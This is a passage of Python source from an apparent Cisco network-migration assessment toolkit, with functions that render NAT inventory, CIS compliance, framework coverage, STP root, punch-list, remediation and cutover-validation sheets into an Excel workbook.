        if report.get("suggested_bands"):
            rows.append(("Suggested re-banding (relative)",
                         "  ".join(f"{s['band']}>={s['threshold']}" for s in report["suggested_bands"])))
    rows.append(("Summary", report.get("note", "")))
    for r, (k, v) in enumerate(rows, 2):
        ws.cell(r, 1, k).font = Font(bold=True)
        ws.cell(r, 2, v)
    for i, w in enumerate([32, 80], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"
    logger.info(f"  [OK] '{SCORE_CALIBRATION_SHEET_NAME}' sheet: {n} switch(es), "
                f"discrimination {report.get('discrimination_quality', '?')}")


NAT_INVENTORY_SHEET_NAME = "NAT Inventory"   # NEW-V3.23.50

def write_nat_sheet(wb, all_nat: dict) -> None:
    """Write the 'NAT Inventory' sheet from {host: parse_nat()} -- every static / dynamic NAT rule,
    pool, and inside/outside interface role, so the migration can recreate them on the new platform."""
    ws = _new_sheet(wb, NAT_INVENTORY_SHEET_NAME)
    for col, h in enumerate(["Switch", "Type", "Detail"], 1):
        c = ws.cell(1, col, h); c.font = Font(bold=True, color="FFFFFF")
        c.fill = PatternFill("solid", fgColor="434343"); c.alignment = Alignment(horizontal="center")
    r = 2; total = 0
    for host in sorted(all_nat):
        nat = all_nat[host] or {}
        for s in nat.get("static", []):
            pp = f" {s['proto']}" if s.get("proto") else ""
            lp = f":{s['local_port']}" if s.get("local_port") else ""
            gp = f":{s['global_port']}" if s.get("global_port") else ""
            ws.cell(r, 1, host); ws.cell(r, 2, f"static{pp}")
            ws.cell(r, 3, f"local {s.get('local', '')}{lp}  <->  global {s.get('global', '')}{gp}"); r += 1; total += 1
        for d in nat.get("dynamic", []):
            ws.cell(r, 1, host); ws.cell(r, 2, "dynamic" + (" (PAT)" if d.get("overload") else ""))
            ws.cell(r, 3, f"list {d.get('acl', '')} via {d.get('kind', '')} {d.get('via', '')}"); r += 1; total += 1
        for name, p in (nat.get("pools") or {}).items():
            ws.cell(r, 1, host); ws.cell(r, 2, "pool")
            ws.cell(r, 3, f"{name}: {p.get('start', '')} - {p.get('end', '')}"); r += 1; total += 1
        if nat.get("inside") or nat.get("outside"):
            ws.cell(r, 1, host); ws.cell(r, 2, "interfaces")
            ws.cell(r, 3, f"inside: {', '.join(nat.get('inside', [])) or '-'}  |  "
                          f"outside: {', '.join(nat.get('outside', [])) or '-'}"); r += 1
    for i, w in enumerate([16, 16, 90], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"
    nhosts = len([h for h in all_nat if all_nat[h]])
    logger.info(f"  [OK] '{NAT_INVENTORY_SHEET_NAME}' sheet: {total} NAT rule(s) across {nhosts} switch(es)")


CONFIG_COMPLIANCE_SHEET_NAME = "Config Compliance"   # CIS-aligned config-hardening checks (NEW-V3.23.59); distinct from the operational 'Security Posture' sheet

def write_security_sheet(wb, all_security: dict) -> None:
    """Write the 'Config Compliance' sheet from {host: parse_security()} -- one row per CIS-aligned
    config-hardening check (pass / fail / na) with severity + remediation, so the migration can
    remediate (or consciously carry) config technical debt. Secret values were redacted by the parser."""
    ws = _new_sheet(wb, CONFIG_COMPLIANCE_SHEET_NAME)
    for col, h in enumerate(["Switch", "Severity", "Status", "Check", "Finding", "CIS / Remediation"], 1):
        c = ws.cell(1, col, h); c.font = Font(bold=True, color="FFFFFF")
        c.fill = PatternFill("solid", fgColor="434343"); c.alignment = Alignment(horizontal="center")
    sev_fill = {"high": "F4CCCC", "medium": "FCE5CD", "low": "FFF2CC"}
    r = 2; total = 0; nfail = 0
    for host in sorted(all_security):
        sec = all_security[host] or {}
        for f in sec.get("findings", []):
            ws.cell(r, 1, host)
            ws.cell(r, 2, (f.get("severity") or "").upper() if f.get("status") == "fail" else "-")
            ws.cell(r, 3, (f.get("status") or "").upper())
            ws.cell(r, 4, f.get("title", ""))
            ws.cell(r, 5, f.get("detail", ""))
            ws.cell(r, 6, f"{f.get('cis_ref', '')} - {f.get('remediation', '')}")
            if f.get("status") == "fail":
                fill = PatternFill("solid", fgColor=sev_fill.get(f.get("severity"), "F4CCCC"))
                for col in range(1, 7):
                    ws.cell(r, col).fill = fill
                nfail += 1
            r += 1; total += 1
    for i, w in enumerate([14, 10, 8, 26, 72, 60], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"
    nhosts = len([h for h in all_security if all_security[h]])
    logger.info(f"  [OK] '{CONFIG_COMPLIANCE_SHEET_NAME}' sheet: {nfail} fail / {total} check(s) "
                f"across {nhosts} switch(es)")


DETECTOR_SCHEMA_SHEET_NAME = "Detector Schema"   # J1: per-detector descriptors (not-observed != healthy as a schema property)

def write_detector_schema_sheet(wb, detector_schema: dict) -> None:
    """Write the 'Detector Schema' sheet from compute_detector_schema() -- the DECLARATIVE registry of
    per-detector descriptors (one row per detector/axis). It DESCRIBES the engine's detectors, it does
    not re-run them: each row states what the detector checks, its healthy value/threshold, the snapshot
    fields it reads, and -- the load-bearing column -- 'Abstains When', the coverage-honest guard that
    makes 'not-observed != healthy' a first-class property (never empty for an evidence-gated detector)."""
    ds = detector_schema if isinstance(detector_schema, dict) else {}
    detectors = ds.get("detectors") or []
    ws = _new_sheet(wb, DETECTOR_SCHEMA_SHEET_NAME)
    # Row 1: disclose that this DESCRIBES detection (never re-runs it) up top, so the sheet cannot be
    # misread as a per-device result table.
    note = (ds.get("summary") or {}).get("note") or \
        "Declarative per-detector descriptors — describes detection, does not re-run it."
    c0 = ws.cell(1, 1, note)
    c0.font = Font(italic=True, color="666666"); ws.merge_cells("A1:I1")
    headers = ["Key", "Detector", "Family", "Checks", "Healthy Value", "Threshold",
               "Cited Fields", "Abstains When", "Source Command"]
    for col, h in enumerate(headers, 1):
        c = ws.cell(2, col, h); c.font = Font(bold=True, color="FFFFFF")
        c.fill = PatternFill("solid", fgColor="434343"); c.alignment = Alignment(horizontal="center")
    r = 3
    for d in detectors:
        if not isinstance(d, dict):
            continue
        thr = d.get("threshold")
        ws.cell(r, 1, d.get("key", ""))
        ws.cell(r, 2, d.get("title", ""))
        ws.cell(r, 3, d.get("family", ""))
        ws.cell(r, 4, d.get("checks", ""))
        ws.cell(r, 5, d.get("healthy_value", ""))
        ws.cell(r, 6, thr if thr is not None else "—")   # explicit em-dash: 'no numeric threshold', never blank
        ws.cell(r, 7, "; ".join(d.get("cited_fields") or []))
        ws.cell(r, 8, d.get("abstains_when", ""))
        ws.cell(r, 9, d.get("source_command", ""))
        r += 1
    for i, w in enumerate([26, 34, 14, 60, 40, 40, 46, 56, 26], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A3"
    logger.info(f"  [OK] '{DETECTOR_SCHEMA_SHEET_NAME}' sheet: {len(detectors)} detector descriptor(s)")


FRAMEWORK_COVERAGE_SHEET_NAME = "Framework Coverage"   # W2-3: CIS/NIST/PCI/STIG mapping over the existing checks

def write_framework_coverage_sheet(wb, framework_coverage: dict) -> None:
    """Write the 'Framework Coverage' sheet from compute_framework_coverage() -- the config-evidenced mapping of the
    engine's hardening checks to CIS / NIST 800-53 / PCI-DSS / DISA-STIG controls (one row per control; status rolls
    up across hosts and the failing hosts are cited for grounding). COVERAGE-HONEST: the scope caveat is rendered
    BEFORE any status (so the sheet can never read as a full audit), and a framework that auto-assessed ZERO controls
    is DISCLOSED as such rather than silently dropped (an empty framework otherwise reads as a fake 'all clear').
    A 'proof of compliance' matrix over existing checks -- NOT a full framework audit."""
    fc = framework_coverage if isinstance(framework_coverage, dict) else {}
    frameworks = fc.get("frameworks") or {}
    ws = _new_sheet(wb, FRAMEWORK_COVERAGE_SHEET_NAME)
    # Row 1: the coverage-honesty caveat, disclosed up top so a reader sees the scope before any pass/fail.
    note = fc.get("note") or "Config-evidenced mapping — NOT a full framework audit."
    scope = fc.get("scope") or ""
    c0 = ws.cell(1, 1, f"{note}  Scope: {scope}" if scope else note)
    c0.font = Font(italic=True, color="666666"); ws.merge_cells("A1:F1")
    for col, h in enumerate(["Framework", "Control", "Status", "Engine Check", "Finding", "Failing Hosts (sample)"], 1):
        c = ws.cell(2, col, h); c.font = Font(bold=True, color="FFFFFF")
        c.fill = PatternFill("solid", fgColor="434343"); c.alignment = Alignment(horizontal="center")
    status_fill = {"fail": "F4CCCC", "na": "FFF2CC", "pass": "D9EAD3"}
    r = 3; total = 0; nfail = 0; nfw = 0
    for key in ("CIS", "NIST", "PCI", "STIG"):
        fw = frameworks.get(key) or {}
        label = fw.get("label") or key
        controls = fw.get("controls") or []
        if not controls:
            # COVERAGE-HONEST: disclose the empty framework (never silently omit -> never a fake 'clear').
            ws.cell(r, 1, label); ws.cell(r, 2, "—"); ws.cell(r, 3, "—")
            ws.cell(r, 5, "0 controls auto-assessed from the config check set — not auto-assessed here (not a full audit)")
            r += 1
            continue
        nfw += 1
        for ctl in controls:
            st = str(ctl.get("status") or "").lower()
            ws.cell(r, 1, label)
            ws.cell(r, 2, ctl.get("control", ""))
            ws.cell(r, 3, st.upper())
            ws.cell(r, 4, ctl.get("check", ""))
            ws.cell(r, 5, ctl.get("title", ""))
            ws.cell(r, 6, ", ".join(ctl.get("hosts_fail") or []) if st == "fail" else "-")
            fill = status_fill.get(st)
            if fill:
                pf = PatternFill("solid", fgColor=fill)
                for col in range(1, 7):
                    ws.cell(r, col).fill = pf
            if st == "fail":
                nfail += 1
            r += 1; total += 1
    for i, w in enumerate([22, 16, 8, 18, 50, 40], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A3"
    logger.info(f"  [OK] '{FRAMEWORK_COVERAGE_SHEET_NAME}' sheet: {nfail} fail / {total} control(s) "
                f"across {nfw} framework(s) with config-evidenced mappings")


CONFIG_HYGIENE_SHEET_NAME = "Config Hygiene"   # Batfish-style undefined refs + unused structures (NEW-V3.23.61)

def write_config_hygiene_sheet(wb, all_hygiene: dict) -> None:
    """Write the 'Config Hygiene' sheet from {host: parse_config_hygiene()} -- undefined references
    (a referenced-but-undefined ACL/route-map/object-group/prefix-list silently does nothing: a real
    migration-breaker) and unused structures (defined-but-never-referenced cruft), so each can be fixed
    or dropped before cutover."""
    ws = _new_sheet(wb, CONFIG_HYGIENE_SHEET_NAME)
    for col, h in enumerate(["Switch", "Issue", "Kind", "Name", "Where / note"], 1):
        c = ws.cell(1, col, h); c.font = Font(bold=True, color="FFFFFF")
        c.fill = PatternFill("solid", fgColor="434343"); c.alignment = Alignment(horizontal="center")
    undef_fill = PatternFill("solid", fgColor="F4CCCC"); unused_fill = PatternFill("solid", fgColor="FFF2CC")
    r = 2; nundef = 0; nunused = 0
    for host in sorted(all_hygiene):
        hyg = all_hygiene[host] or {}
        for u in hyg.get("undefined", []):
            ws.cell(r, 1, host); ws.cell(r, 2, "undefined reference"); ws.cell(r, 3, u.get("kind", ""))
            ws.cell(r, 4, u.get("name", "")); ws.cell(r, 5, u.get("context", ""))
            for col in range(1, 6): ws.cell(r, col).fill = undef_fill
            r += 1; nundef += 1
        for u in hyg.get("unused", []):
            ws.cell(r, 1, host); ws.cell(r, 2, "unused (no reference found)"); ws.cell(r, 3, u.get("kind", ""))
            ws.cell(r, 4, u.get("name", "")); ws.cell(r, 5, "defined but never referenced in the running-config")
            for col in range(1, 6): ws.cell(r, col).fill = unused_fill
            r += 1; nunused += 1
    nhosts = len([h for h in all_hygiene if all_hygiene[h]])
    if r == 2:   # no hygiene issues found -> coverage-honest 'no issues', NOT a fleet-wide clean bill (audit-5 #23)
        ws.cell(2, 1, "no issues")
        ws.cell(2, 2, f"No undefined-reference / unused-structure issue among the {nhosts} device(s) with a "
                      f"collected running-config. Devices without a collected running-config are NOT assessed.")
    for i, w in enumerate([14, 26, 16, 26, 64], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"
    logger.info(f"  [OK] '{CONFIG_HYGIENE_SHEET_NAME}' sheet: {nundef} undefined ref(s), "
                f"{nunused} unused across {nhosts} switch(es)")


STP_ROOTS_SHEET_NAME = "STP Root Bridges"   # root-bridge placement analysis (NEW-V3.23.62)

def write_stp_roots_sheet(wb, all_stp_roots: dict, all_interfaces: dict) -> None:
    """Write the 'STP Root Bridges' sheet: per VLAN, which switch is the spanning-tree root, its
    bridge priority, whether that root is ACCIDENTAL (default priority -> elected on a MAC tiebreak,
    not by design) and whether it ALIGNS with the VLAN's L3 gateway (root != gateway -> the path to
    the default gateway hairpins through the root). Migration-relevant L2 design hygiene.

    Both verdict columns are TRI-STATE. `stp_root_findings` abstains in two cases -- an MST record (both
    checks are PVST/RPVST-only, it `continue`s) and a VLAN for which NO gateway SVI was collected (it
    cannot be in `misaligned`, because there is nothing to be misaligned WITH). Reading those abstentions
    as an empty findings list rendered 'Accidental root? = no' and 'Aligned? = yes': the clean value, for
    an axis nothing was ever compared on. On an access-only collection -- where every gateway SVI sits on
    an uncollected core -- that is a fabricated fleet-wide 'aligned' down the whole sheet (seen exactly so
    in a shipped deliverable). Absence of evidence is never health, so those rows carry
    HEALTH_NOT_OBSERVED instead."""
    from cisco_toolkit.analyze import stp_root_findings
    f = stp_root_findings(all_stp_roots, all_interfaces)
    acc = {(x["vlan"], x["host"]) for x in f["accidental"]}
    mis = {x["vlan"]: x["gateways"] for x in f["misaligned"]}
    # Which VLANs the gateway join could see AT ALL -- keyed exactly as stp_root_findings' own `gw_of`
    # (leading-zero-tolerant SVI id + a non-empty svi_ip), so "no gateway observed" here means precisely
    # "the analyze-side join had nothing to compare", not a second opinion about it.
    gw_seen: Dict[str, set] = {}
    for _h, _ifaces in (all_interfaces or {}).items():
        for _port, _d in (_ifaces or {}).items():
            _m = re.match(r"^Vlan0*(\d+)$", _port or "", re.IGNORECASE)
            if _m and (getattr(_d, "svi_ip", "") or "").strip():
                gw_seen.setdefault(_m.group(1), set()).add(_h)
    ws = _new_sheet(wb, STP_ROOTS_SHEET_NAME)
    for col, h in enumerate(["VLAN", "Root switch", "Root priority", "Accidental root?",
                             "VLAN gateway(s)", "Aligned?"], 1):
        c = ws.cell(1, col, h); c.font = Font(bold=True, color="FFFFFF")
        c.fill = PatternFill("solid", fgColor="434343"); c.alignment = Alignment(horizontal="center")
    root_of: dict = {}
    for host in sorted(all_stp_roots or {}):
        for vlan, r in (all_stp_roots[host] or {}).items():
            if r.get("is_root"):
                root_of.setdefault(vlan, (host, r.get("root_priority"), bool(r.get("is_mst"))))
    warn = PatternFill("solid", fgColor="FCE5CD")
    blind = PatternFill("solid", fgColor="EFEFEF")   # neutral grey — the established not-observed shade
    r = 2; nrows = 0
    for vlan in sorted(root_of, key=lambda v: int(v)):
        host, prio, is_mst = root_of[vlan]
        is_acc = (vlan, host) in acc
        gws = mis.get(vlan)
        seen = gw_seen.get(vlan)
        ws.cell(r, 1, vlan); ws.cell(r, 2, host)
        ws.cell(r, 3, prio if prio is not None else "")
        if is_mst:
            # analyze skips MST outright: the 32768+vlan test would cry wolf on an INSTANCE number and the
            # gateway join is keyed on real VLAN ids, so neither verdict was evaluated for this row.
            ws.cell(r, 4, HEALTH_NOT_OBSERVED)
            ws.cell(r, 5, "(MST instance — root/gateway join is PVST/RPVST-only)")
            ws.cell(r, 6, HEALTH_NOT_OBSERVED)
        else:
            ws.cell(r, 4, "yes (default priority)" if is_acc else "no")
            if gws:
                ws.cell(r, 5, ", ".join(gws)); ws.cell(r, 6, "no - root != gateway")
            elif seen:
                ws.cell(r, 5, ", ".join(sorted(seen))); ws.cell(r, 6, "yes")
            else:
                ws.cell(r, 5, "(no gateway SVI collected for this VLAN)")
                ws.cell(r, 6, HEALTH_NOT_OBSERVED)
        if is_mst or (not is_acc and not gws and not seen):
            ws.cell(r, 6).fill = blind
            if is_mst:
                ws.cell(r, 4).fill = blind
        if is_acc or gws:
            for col in range(1, 7):
                ws.cell(r, col).fill = warn
        r += 1; nrows += 1
    for i, w in enumerate([8, 16, 14, 20, 28, 22], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"
    logger.info(f"  [OK] '{STP_ROOTS_SHEET_NAME}' sheet: {nrows} rooted VLAN(s), "
                f"{len(f['accidental'])} accidental, {len(f['misaligned'])} misaligned")


PUNCHLIST_SHEET_NAME = "Migration Punch-List"   # consolidated severity-ranked roll-up (NEW-V3.23.63)

# review r10 EXIT X -- the point-of-use disclosure for a severity that is NOT a measurement.
#
# compute_migration_punchlist's media fold carries the producer's own `severity_basis` /
# `evidence_confidence` onto the item (analyze.py :4386), and until now NO punch-list renderer read
# either key: the basis reached a workbook reader only as a bracketed tail on the Detail cell, which
# measures 734 characters on a real run -- roughly thirteen wrapped lines PAST the point where the
# reader has already accepted the "High". So a High raised by a CURATED, explicitly non-authoritative
# on-air classification looked exactly like a High raised by an observed measurement.
#
# Deliberately NOT a new column, and this is measured rather than assumed: on the reference pipeline
# workbook 37 of 37 punch-list rows publish no basis at all (the fabric has no multicast estate), so a
# column would be 100% blank in the very deliverable the golden pins, and on the rows where it is not
# blank it would repeat the Detail text verbatim -- ornamental both ways. A cell NOTE on the Severity
# cell costs a basis-less row NOTHING (no blank cell to misread as "nothing to disclose", and Excel
# draws its marker only where a note exists), lands on the exact cell whose claim it qualifies, and
# leaves the golden-pinned header row untouched. The Detail prose STAYS as-is: it is the copy that
# survives printing/PDF, where notes do not, so the two layers are permanent record + point-of-use.
_PUNCH_NOTE_MAX = 900          # pathological-length bound only; a real basis is ~200 chars


def punchlist_severity_note(it) -> str:
    """The Severity-cell note for one punch-list item, or "" when the item publishes no usable basis.

    FAIL CLOSED, and keyed on the VALUE being usable prose rather than on the key being PRESENT --
    key-presence is the fail-open shape this review keeps finding: a null / 0 / {} / "   " value
    satisfies `"severity_basis" in it` and would then render an EMPTY note, which a reader takes for
    "nothing to disclose". An unusable value is treated exactly like a missing one: no note at all,
    i.e. the row stays an ordinary punch-list row and acquires no noise. A row that DOES publish a
    basis but no usable confidence says the confidence is unpublished, rather than quietly shipping
    half a disclosure. The producer's strings are rendered verbatim -- this sheet never re-derives the
    promotion rule or re-classifies the basis, exactly as the mac-alias cell above does not.
    """
    def _usable(v):
        return v.strip() if isinstance(v, str) and v.strip() else ""

    def _bound(s):
        return s if len(s) <= _PUNCH_NOTE_MAX else s[:_PUNCH_NOTE_MAX].rsplit(" ", 1)[0] + " …"

    basis = _usable(it.get("severity_basis") if isinstance(it, dict) else None)
    if not basis:
        return ""
    conf = _usable(it.get("evidence_confidence")) or "NOT published by this snapshot"
    return ("Why this severity — the basis this finding published for it.\n\n"
            f"Basis: {_bound(basis)}\n\nEvidence: {_bound(conf)}")


def write_punchlist_sheet(wb, punchlist: list) -> None:
    """Write the 'Migration Punch-List' sheet: the consolidated, severity-ranked, per-device,
    per-wave roll-up of every actionable finding (cross-layer SPOFs, security, config hygiene,
    L1/L3, protocol, STP, device health) with remediation -- the executive 'fix-this-first, in
    this order' one-pager. Rows are colour-banded by severity (Critical -> Low)."""
    ws = _new_sheet(wb, PUNCHLIST_SHEET_NAME)
    headers = ["#", "Severity", "Category", "Device(s)", "Wave", "Issue", "Detail", "Remediation"]
    for col, h in enumerate(headers, 1):
        c = ws.cell(1, col, h); c.font = Font(bold=True, color="FFFFFF")
        c.fill = PatternFill("solid", fgColor="434343"); c.alignment = Alignment(horizontal="center")
    sev_fill = {"Critical": "F4CCCC", "High": "FCE5CD", "Medium": "FFF2CC", "Low": "EFEFEF"}
    r = 2
    for it in (punchlist or []):
        ws.cell(r, 1, it.get("priority", r - 1))
        ws.cell(r, 2, it.get("severity", ""))
        ws.cell(r, 3, it.get("category", ""))
        ws.cell(r, 4, ", ".join(it.get("devices", [])))
        ws.cell(r, 5, it.get("wave", ""))
        ws.cell(r, 6, it.get("title", ""))
        ws.cell(r, 7, it.get("detail", ""))
        ws.cell(r, 8, it.get("remediation", ""))
        # The severity's own basis, attached to the severity. xml_safe because a `--no-collect`
        # re-analysis feeds this writer a raw snapshot section, and one illegal byte in a comment
        # aborts the whole .xlsx.
        _note = punchlist_severity_note(it)
        if _note:
            _c = Comment(xml_safe(_note), "cisco-assess")
            # Size the box to the TEXT, do not fix it and hope. The note is bounded at
            # _PUNCH_NOTE_MAX per half, so it can reach ~1,800 characters, while a fixed 460x190 box
            # shows roughly 850 -- more than half the basis silently invisible in a client workbook.
            # A note that cannot be read is the same failure as a note that was never written, and it
            # is worse for being invisible: the reader sees a comment marker and believes they have
            # the whole reason. ~65 chars per line at this width, ~14px per line, plus a little
            # padding; height is capped so one pathological snapshot cannot produce a full-screen box,
            # and the per-half truncation above keeps the content inside that cap.
            _lines = sum(max(1, -(-len(seg) // 65)) for seg in _note.split("\n"))
            _c.width = 460
            _c.height = max(190, min(14 * _lines + 30, 620))
            ws.cell(r, 2).comment = _c
        fill = PatternFill("solid", fgColor=sev_fill.get(it.get("severity"), "FFFFFF"))
        for col in range(1, 9):
            ws.cell(r, col).fill = fill
        r += 1
    for i, w in enumerate([5, 10, 14, 22, 16, 34, 60, 50], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    ws.freeze_panes = "A2"
    ncrit = sum(1 for it in (punchlist or []) if it.get("severity") == "Critical")
    logger.info(f"  [OK] '{PUNCHLIST_SHEET_NAME}' sheet: {len(punchlist or [])} item(s), {ncrit} critical")


REMEDIATION_PLAN_SHEET_NAME = "Remediation Plan"   # NEW-V3.23.116 (assess->act: generated config snippets)

def write_remediation_plan_sheet(wb, rp: dict) -> None:
    """Write 'Remediation Plan' from compute_remediation_plan(): per-device, platform-tagged Cisco config
    snippets generated FOR REVIEW from the structured findings. Row 1 carries the review banner."""
    if REMEDIATION_PLAN_SHEET_NAME in wb.sheetnames:
        del wb[REMEDIATION_PLAN_SHEET_NAME]
    ws = _new_sheet(wb, REMEDIATION_PLAN_SHEET_NAME)
    p = rp or {}
    items = p.get("items") or []
    s = p.get("summary") or {}
    b = ws.cell(1, 1, "⚠ " + (p.get("banner") or "GENERATED FOR REVIEW — validate before applying."))
    b.font = Font(bold=True, color="9C0006", size=10)
    b.alignment = Alignment(horizontal="left", wrap_text=True)
    ws.cell(2, 1, f"{s.get('n_items', 0)} item(s) across {s.get('n_devices', 0)} device(s) · "
                  f"{s.get('n_high', 0)} High/Critical · by category: "
                  + ", ".join(f"{k} {v}" for k, v in (s.get("by_category") or {}).items())).font = Font(size=10)
    hdr_row = 4
    cols = ["#", "Device", "Platform", "Category", "Severity", "Issue",
            "Config (review before applying)", "Verify", "Caution"]
    for i, h in enumerate(cols, 1):
        c = ws.cell(hdr_row, i, h); c.font = Font(bold=True, color="FFFFFF", size=10)
        c.fill = PatternFill("solid", fgColor="434343")
        c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    ws.freeze_panes = ws.cell(hdr_row + 1, 1)
    SEVFILL = {"Critical": "F4CCCC", "High": "FCE4D6", "Medium": "FFF2CC", "Low": "D9EAD3", "Info": "EFEFEF"}
    DAT = Font(name="Calibri", size=10); MONO = Font(name="Consolas", size=9)
    r = hdr_row + 1
    for n, it in enumerate(items, 1):
        vals = [n, it.get("device"), it.get("platform"), it.get("category"), it.get("severity"),
                it.get("title"), "\n".join(it.get("commands") or []), it.get("verify"), it.get("caution")]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v); c.font = (MONO if col == 7 else DAT)
            c.alignment = Alignment(horizontal="center" if col in (1, 3, 5) else "left",
                                    vertical="top", wrap_text=col in (6, 7, 9))
            if col == 5:
                c.fill = PatternFill("solid", fgColor=SEVFILL.get(v, "FFFFFF"))
        r += 1
    for i, w in enumerate([5, 28, 9, 15, 10, 34, 54, 28, 40], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    logger.info(f"  [OK] '{REMEDIATION_PLAN_SHEET_NAME}' sheet: {len(items)} item(s), "
                f"{s.get('n_devices', 0)} device(s)")


VALIDATION_PLAN_SHEET_NAME = "Cutover Validation"   # NEW-V3.23.143 (per-wave post-cutover verification checklist)

def write_validation_plan_sheet(wb, vp: dict) -> None:
    """Write 'Cutover Validation' from compute_validation_plan(): the per-wave checks to run AFTER each
    cutover, each with the command + the expected good result captured from the pre-cutover state. Row 1
    carries the how-to-use banner."""
    if VALIDATION_PLAN_SHEET_NAME in wb.sheetnames:
        del wb[VALIDATION_PLAN_SHEET_NAME]
    ws = _new_sheet(wb, VALIDATION_PLAN_SHEET_NAME)
    p = vp or {}
    items = p.get("items") or []
    s = p.get("summary") or {}
    b = ws.cell(1, 1, "✓ " + (p.get("banner") or "Run after each wave's cutover to confirm it succeeded."))
    b.font = Font(bold=True, color="1F6E43", size=10)
    b.alignment = Alignment(horizontal="left", wrap_text=True)
    # 'validation group(s)', not 'wave(s)': n_waves here is the validation_plan.by_wave count (per move-group,
    # the 3 groups with checks) -- a distinct unit from the sequenced wave_plan waves (the 9). Mirrors the
    # runbook §11.3 summary; 'wave' stays reserved for the wave_plan. (The 'Wave' column header is left as-is:
    # it is a shared layout with the NRFU Commands / VLAN cutover sheets, out of this fix's scope.)
    ws.cell(2, 1, f"{s.get('n_items', 0)} check(s) across {s.get('n_waves', 0)} validation group(s) · "
                  f"{s.get('n_high', 0)} High/Critical · by category: "
                  + ", ".join(f"{k} {v}" for k, v in (s.get("by_category") or {}).items())).font = Font(size=10)
    hdr_row = 4
    cols = ["#", "Wave", "Device", "Platform", "Category", "Severity", "Check",
            "Command", "Expect (good result)", "Why it matters"]
    for i, h in enumerate(cols, 1):
        c = ws.cell(hdr_row, i, h); c.font = Font(bold=True, color="FFFFFF", size=10)
        c.fill = PatternFill("solid", fgColor="1F6E43")
        c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    ws.freeze_panes = ws.cell(hdr_row + 1, 1)
    SEVFILL = {"Critical": "F4CCCC", "High": "FCE4D6", "Medium": "FFF2CC", "Low": "D9EAD3", "Info": "EFEFEF"}
    DAT = Font(name="Calibri", size=10); MONO = Font(name="Consolas", size=9)
    r = hdr_row + 1
    for n, it in enumerate(items, 1):
        vals = [n, it.get("wave"), it.get("device"), it.get("platform"), it.get("category"),
                it.get("severity"), it.get("check"), it.get("command"), it.get("expect"), it.get("why")]
        for col, v in enumerate(vals, 1):
            c = ws.cell(r, col, v); c.font = (MONO if col in (8, 9) else DAT)
            c.alignment = Alignment(horizontal="center" if col in (1, 4, 6) else "left",
                                    vertical="top", wrap_text=col in (7, 8, 9, 10))
            if col == 6:
                c.fill = PatternFill("solid", fgColor=SEVFILL.get(v, "FFFFFF"))
        r += 1
    for i, w in enumerate([5, 12, 22, 9, 14, 10, 40, 34, 40, 50], 1):
        ws.column_dimensions[chr(64 + i)].width = w
    logger.info(f"  [OK] '{VALIDATION_PLAN_SHEET_NAME}' sheet: {len(items)} check(s), "
                f"{s.get('n_waves', 0)} validation group(s)")


NRFU_COMMANDS_SHEET_NAME = "NRFU Commands"   # NEW (four-phase NRFU certification pack; orchestration-roadmap frontier)

def write_nrfu_commands_sheet(wb, nc: dict) -> None:
    """Write 'NRFU Commands' from compute_nrfu_commands() (cisco_toolkit/nrfu_export.py): the four-phase,
    per-wave certification pack — every row an ASSERTIVE read-only command with the EXPECTED value
    pre-filled from the snapshot evidence and its source key cited. '[NOT OBSERVED …]' rows are honest
    abstentions (grey-filled). Row 1 carries the how-to-use banner; mirrors the Cutover Validation
    sheet's layout (that sheet is the post-cutover spot-check list; this is the certification pack)."""
    if NRFU_COMMANDS_SHEET_NAME in wb.sheetnames:
        del wb[NRFU_COMMANDS_SHEET_NAME]
    ws = _new_sheet(wb, NRFU_COMMANDS_SHEET_NAME)
    p = nc or {}
    s = p.get("summary") or {}
    b = ws.cell(1, 1, "✓ " + (p.get("banner") or "Four-phase NRFU certification pack: confirm each "
                                                 "read-only command's output matches the expected value."))
    b.font = Font(bold=True, color="1F4E79", size=10)
    b.alignment = Alignment(horizontal="left", wrap_text=True)
    _byp = s.get("by_phase") or {}
    ws.cell(2, 1, f"{s.get('n_cases', 0)} case(s) across {s.get('n_waves', 0)} wave(s) / "
                  f"{s.get('n_devices', 0)} device(s) · by phase: "
                  + ", ".join(f"P{k} {v}" for k, v in sorted(_byp.items(), key=lambda kv: str(kv[0])))
                  + f" · {s.get('n_not_observed', 0)} not-observed baseline(s) to record · "
                    f"{s.get('n_human_executed', 0)} human-executed (Phase IV)").font = Font(size=10)
    hdr_row = 4
    cols = ["#", "Wave", "Device", "Dialect", "Case ID", "Phase", "Scope",
            "Command", "Expected (from snapshot)", "Source key"]
    for i, h in enumerate(cols, 1):
        c = ws.cell(hdr_row, i, h); c.font = Font(bold=True, color="FFFFFF", size=10)
        c.fill = PatternFill("solid", fgColor="1F4E79")
        c.alignment = Alignment(horizontal="center", vertical="center", wrap_text=True)
    ws.freeze_panes = ws.cell(hdr_row + 1, 1)
    PHASEFILL = {1: "DDEBF7", 2: "E2EFDA", 3: "FFF2CC", 4: "FCE4D6"}
    ROMAN = {1: "I", 2: "II", 3: "III", 4: "IV"}
    DAT = Font(name="Calibri", size=10); MONO = Font(name="Consolas", size=9)
    r = hdr_row + 1
    n = 0
    for w in p.get("waves") or []:
        for dev in w.get("devices") or []:
            for case in dev.get("cases") or []:
                n += 1
                ph = case.get("phase")
                vals = [n, w.get("wave_id"), dev.get("host"), dev.get("platform_dialect"),
                        case.get("id"), ROMAN.get(ph, ph), case.get("scope"),
                        case.get("command"), case.get("expected"), case.get("source_key")]
                for col, v in enumerate(vals, 1):
                    c = ws.cell(r, col, v); c.font = (MONO if col in (5, 8, 9, 10) else DAT)
                    c.alignment = Alignment(horizontal="center" if col in (1, 4, 6, 7) else "left",
                                            vertical="top", wrap_text=col in (8, 9, 10))
                    if col == 6:
                        c.fill = PatternFill("solid", fgColor=PHASEFILL.get(ph, "FFFFFF"))
                if str(case.get("expected", "")).startswith("[NOT OBSERVED"):
